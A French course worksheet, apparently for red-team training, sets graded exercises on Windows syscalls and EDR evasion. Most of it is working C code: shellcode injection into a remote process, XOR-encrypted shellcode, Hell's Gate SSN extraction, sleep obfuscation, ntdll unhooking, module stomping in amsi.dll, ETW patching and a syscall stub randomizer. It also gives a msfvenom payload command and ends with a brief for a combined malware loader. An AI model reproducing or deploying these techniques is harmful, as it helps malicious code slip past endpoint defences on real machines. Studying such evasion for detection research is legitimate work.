# Exercices Pratiques - Syscalls et Évasion EDR

## 🎯 Objectifs

Ces exercices vous permettront de :
- ✅ Comprendre en pratique le fonctionnement des syscalls
- ✅ Implémenter vos propres techniques d'évasion
- ✅ Tester la détection par les EDR
- ✅ Améliorer le code fourni

---

## 📋 Prérequis

- ✅ Avoir lu le cours théorique (`COURS_SYSCALLS_EDR.md`)
- ✅ Avoir compilé les démonstrations
- ✅ Avoir un environnement de test (VM Windows)
- ✅ Connaissances en C et assembleur x64

---

## 🥉 Niveau Débutant

### Exercice 1 : Modifier le shellcode

**Objectif** : Remplacer le shellcode par défaut par un qui affiche une MessageBox

**Étapes** :
1. Ouvrir `demo_injection.c`
2. Remplacer `g_Shellcode` par le shellcode suivant :

```c
// Shellcode : MessageBoxA("Hello", "Syscall Test", MB_OK)
unsigned char g_Shellcode[] = {
    // À compléter : générer avec msfvenom ou écrire en ASM
    0x48, 0x83, 0xEC, 0x28,              // sub rsp, 0x28
    // ... votre code ici ...
    0xC3                                  // ret
};
```

3. Compiler et tester
4. Observer le résultat

**Bonus** : Utiliser `msfvenom` pour générer le shellcode :
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```

---

### Exercice 2 : Ajouter des logs de debug

**Objectif** : Ajouter des printf pour mieux comprendre le flux d'exécution

**Étapes** :
1. Dans `syscalls_indirect.c`, fonction `InitializeIndirectSyscalls()`
2. Ajouter des logs après chaque étape importante :

```c
printf("[DEBUG] Chargement de ntdll.dll...\n");
if (!LoadFreshNtdll()) {
    printf("[DEBUG] Échec du chargement\n");
    return FALSE;
}
printf("[DEBUG] ntdll chargée à l'adresse : 0x%p\n", g_FreshNtdll);
```

3. Observer le comportement détaillé

---

### Exercice 3 : Tester avec Windows Defender

**Objectif** : Observer la détection (ou non) par Windows Defender

**Étapes** :
1. Activer Windows Defender
2. Compiler `demo_injection.exe`
3. Exécuter et observer si Windows Defender bloque
4. Tester avec les 3 versions :
   - API Windows normales (VirtualAlloc)
   - Syscalls directs
   - Syscalls indirects
5. Noter les différences de détection

**Questions** :
- Quelle version est détectée ?
- Pourquoi certaines passent et d'autres non ?
- Que voit Windows Defender exactement ?

---

## 🥈 Niveau Intermédiaire

### Exercice 4 : Injection dans un processus distant

**Objectif** : Modifier le code pour injecter dans un autre processus (notepad.exe)

**Étapes** :

1. Lancer notepad.exe et récupérer son PID :
```c
// Ouvrir le processus cible
DWORD targetPID = 1234;  // Remplacer par le PID de notepad
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
```

2. Modifier toutes les fonctions pour utiliser `hProcess` au lieu de `GetCurrentProcess()`

3. Compiler et tester

**Attention** : Nécessite des privilèges élevés

**Code de référence** :
```c
// Allocation dans le processus distant
NTSTATUS status = NtAllocateVirtualMemory_Indirect(
    hProcess,  // ← Processus distant au lieu de GetCurrentProcess()
    &baseAddress,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

---

### Exercice 5 : Chiffrement du shellcode

**Objectif** : Chiffrer le shellcode pour éviter la détection par signature

**Étapes** :

1. Créer une fonction de chiffrement XOR :
```c
void XorCrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}
```

2. Chiffrer le shellcode avant de le compiler :
```c
unsigned char g_Shellcode[] = { /* ... shellcode chiffré ... */ };
unsigned char g_XorKey = 0xAA;
```

3. Déchiffrer après l'avoir écrit en mémoire :
```c
// Après NtWriteVirtualMemory_Indirect
XorCrypt((unsigned char*)baseAddress, shellcodeSize, g_XorKey);
```

4. Tester avec Windows Defender

**Questions** :
- Le shellcode chiffré est-il détecté ?
- Que se passe-t-il si on chiffre avec plusieurs passes ?

---

### Exercice 6 : Extraire les SSN pour d'autres fonctions

**Objectif** : Ajouter le support de nouvelles fonctions syscall

**Fonctions à ajouter** :
- `NtReadVirtualMemory`
- `NtQuerySystemInformation`
- `NtOpenProcess`

**Étapes** :

1. Ajouter les prototypes dans `syscalls.h`
2. Ajouter les indices dans `syscalls_indirect.c` :
```c
#define IDX_NtReadVirtualMemory     6
#define IDX_NtQuerySystemInformation 7
#define IDX_NtOpenProcess           8
```

3. Ajouter dans la table de résolution :
```c
const char* functionNames[] = {
    "NtAllocateVirtualMemory",
    // ... existants ...
    "NtReadVirtualMemory",
    "NtQuerySystemInformation",
    "NtOpenProcess"
};
```

4. Implémenter les wrappers en assembleur inline

---

## 🥇 Niveau Avancé

### Exercice 7 : Hell's Gate / Halo's Gate

**Objectif** : Implémenter la technique Hell's Gate pour extraire les SSN au runtime

**Principe** :
Hell's Gate lit directement dans ntdll.dll en mémoire pour extraire les SSN, même si la fonction est hookée.

**Étapes** :

1. Créer une fonction qui lit les bytes d'une fonction :
```c
DWORD GetSSNFromMemory(PVOID functionAddress) {
    BYTE* bytes = (BYTE*)functionAddress;
    
    // Vérifier si hookée (commence par E9 ou E8 = jmp/call)
    if (bytes[0] == 0xE9 || bytes[0] == 0xE8) {
        // Fonction hookée, chercher dans les fonctions voisines
        return GetSSNFromNeighbor(functionAddress);
    }
    
    // Si pas hookée, extraire normalement
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
        if (bytes[3] == 0xB8) {
            return *(DWORD*)(bytes + 4);
        }
    }
    
    return 0;
}
```

2. Implémenter `GetSSNFromNeighbor()` qui cherche dans les fonctions adjacentes

3. Tester avec ntdll hookée par un EDR

**Ressources** :
- Hell's Gate : https://github.com/am0nsec/HellsGate
- Halo's Gate : https://blog.sektor7.net/#!res/2021/halosgate.md

---

### Exercice 8 : Sleep Obfuscation

**Objectif** : Implémenter une technique de "sleep obfuscation" pour éviter la détection pendant le sleep

**Principe** :
Chiffrer la stack pendant le sleep pour éviter les scans mémoire

**Technique Ekko** :

```c
void SleepObfuscation(DWORD milliseconds) {
    // 1. Créer un timer
    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    
    // 2. Sauvegarder le contexte du thread
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(GetCurrentThread(), &ctx);
    
    // 3. Chiffrer la stack
    XorCrypt((unsigned char*)ctx.Rsp, 0x1000, 0xAA);
    
    // 4. Attendre
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -(milliseconds * 10000LL);
    SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
    WaitForSingleObject(hTimer, INFINITE);
    
    // 5. Déchiffrer la stack
    XorCrypt((unsigned char*)ctx.Rsp, 0x1000, 0xAA);
    
    CloseHandle(hTimer);
}
```

**Ressources** :
- Ekko : https://github.com/Cracked5pider/Ekko

---

### Exercice 9 : Unhooking NTDLL

**Objectif** : Restaurer ntdll.dll en supprimant les hooks EDR

**Principe** :
Remplacer la section `.text` de ntdll en mémoire par une copie fraîche du disque

**Étapes** :

```c
BOOL UnhookNTDLL() {
    // 1. Obtenir l'adresse de ntdll en mémoire
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // 2. Charger ntdll fraîche depuis le disque
    PVOID freshNtdll = LoadFreshNtdll();
    
    // 3. Parser les PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    
    // 4. Trouver la section .text
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            // 5. Changer les protections
            DWORD oldProtect;
            VirtualProtect(
                (BYTE*)hNtdll + section[i].VirtualAddress,
                section[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect
            );
            
            // 6. Copier la section .text fraîche
            memcpy(
                (BYTE*)hNtdll + section[i].VirtualAddress,
                (BYTE*)freshNtdll + section[i].VirtualAddress,
                section[i].Misc.VirtualSize
            );
            
            // 7. Restaurer les protections
            VirtualProtect(
                (BYTE*)hNtdll + section[i].VirtualAddress,
                section[i].Misc.VirtualSize,
                oldProtect,
                &oldProtect
            );
            
            break;
        }
    }
    
    return TRUE;
}
```

**Test** :
1. Hook ntdll avec un EDR de test
2. Exécuter unhooking
3. Vérifier que les hooks sont supprimés

---

### Exercice 10 : Module Stomping

**Objectif** : Implémenter la technique de "module stomping" pour cacher notre shellcode

**Principe** :
Au lieu d'allouer de la nouvelle mémoire (suspect), on écrit dans une DLL légitime déjà chargée

**Étapes** :

```c
BOOL ModuleStomping() {
    // 1. Charger une DLL légitime mais inutilisée
    HMODULE hModule = LoadLibraryA("amsi.dll");  // Ou winhttp.dll, etc.
    
    // 2. Trouver une section avec de l'espace
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    
    // 3. Trouver une cave (espace vide) dans .text
    PVOID caveAddress = FindCodeCave(hModule, shellcodeSize);
    
    // 4. Changer les protections
    DWORD oldProtect;
    VirtualProtect(caveAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 5. Écrire le shellcode
    memcpy(caveAddress, shellcode, shellcodeSize);
    
    // 6. Restaurer les protections
    VirtualProtect(caveAddress, shellcodeSize, oldProtect, &oldProtect);
    
    // 7. Exécuter
    HANDLE hThread;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)caveAddress, NULL, 0, NULL);
    
    return TRUE;
}
```

**Avantages** :
- Pas d'allocation mémoire suspecte
- Le shellcode est dans une DLL légitime
- Plus difficile à détecter

---

## 🏆 Niveau Expert

### Exercice 11 : Bypasser ETW

**Objectif** : Désactiver Event Tracing for Windows pour éviter la télémétrie

**Technique** :
Patcher `EtwEventWrite` dans ntdll.dll

```c
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Patch : remplacer par "ret" (0xC3)
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pEtwEventWrite = 0xC3;  // ret
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    
    return TRUE;
}
```

**Alternative avec syscalls indirects** :
Utiliser `NtProtectVirtualMemory_Indirect` pour patcher

---

### Exercice 12 : Créer un "syscall stub randomizer"

**Objectif** : Randomiser l'ordre et le contenu des syscalls pour éviter les signatures

**Étapes** :

1. Générer du code junk entre les instructions :
```c
void GenerateRandomizedStub(DWORD ssn, PVOID syscallAddr, BYTE* output) {
    int offset = 0;
    
    // mov r10, rcx
    output[offset++] = 0x4C;
    output[offset++] = 0x8B;
    output[offset++] = 0xD1;
    
    // Junk : nop random
    for (int i = 0; i < rand() % 5; i++) {
        output[offset++] = 0x90;  // nop
    }
    
    // mov eax, ssn
    output[offset++] = 0xB8;
    *(DWORD*)&output[offset] = ssn;
    offset += 4;
    
    // Junk
    output[offset++] = 0x90;
    
    // jmp syscallAddr
    output[offset++] = 0xFF;
    output[offset++] = 0x25;
    *(DWORD*)&output[offset] = 0;  // RIP-relative
    offset += 4;
    *(PVOID*)&output[offset] = syscallAddr;
}
```

2. Utiliser ce stub généré dynamiquement

---

## 📊 Checklist de Progression

```
DÉBUTANT
□ Exercice 1 : Modifier le shellcode
□ Exercice 2 : Ajouter des logs
□ Exercice 3 : Tester avec Defender

INTERMÉDIAIRE
□ Exercice 4 : Injection processus distant
□ Exercice 5 : Chiffrement shellcode
□ Exercice 6 : Ajouter des syscalls

AVANCÉ
□ Exercice 7 : Hell's Gate
□ Exercice 8 : Sleep obfuscation
□ Exercice 9 : Unhooking NTDLL

EXPERT
□ Exercice 10 : Module stomping
□ Exercice 11 : Bypasser ETW
□ Exercice 12 : Syscall randomizer
```

---

## 🎓 Projet Final

**Objectif** : Créer un loader complet qui combine toutes les techniques

**Fonctionnalités** :
1. Unhooking NTDLL au démarrage
2. Syscalls indirects pour toutes les opérations
3. Shellcode chiffré (AES ou RC4)
4. Module stomping au lieu d'allocation
5. Sleep obfuscation pendant l'exécution
6. Bypass ETW
7. Injection dans processus légitime

**Structure suggérée** :
```
projet_final/
├── main.c              # Point d'entrée
├── unhook.c            # Unhooking NTDLL
├── syscalls.c          # Syscalls indirects
├── crypto.c            # Chiffrement
├── injection.c         # Techniques d'injection
├── evasion.c           # Techniques d'évasion
└── utils.c             # Fonctions utilitaires
```

---

Bonne chance ! 🚀
